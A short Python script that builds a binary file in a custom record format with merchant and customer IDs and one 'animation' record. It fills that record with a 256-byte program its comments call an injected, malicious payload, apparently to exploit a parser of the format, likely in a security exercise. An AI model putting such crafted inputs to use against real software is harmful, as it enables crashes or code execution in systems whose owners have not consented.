import struct
import sys

# We build the content of the file in a byte string first
# This lets us calculate the length for the header at the end
data = b''
data += b"A" * 32  # Merchant ID
data += b"B" * 32  # Customer ID
data += struct.pack("<I", 1)  # One record
# Record of type animation
data += struct.pack("<I", 8 + 32 + 256)  # Record size (4 bytes)
data += struct.pack("<I", 3)  # Record type (4 bytes)
data += b"A " * 16   # Note: 32 byte message
program = bytearray(256)

# Injecting  Payload:
program[0] = 0x03
program[1] = 10
program[2] = 12
program[3:] = b"\x00" * (256 - 3)

# Writing the malicious program into the data payload
data += bytes(program)


f = open(sys.argv[1], 'wb')
datalen = len(data) + 4  # Plus 4 bytes for the length itself
f.write(struct.pack("<I", datalen))
f.write(data)
f.close()
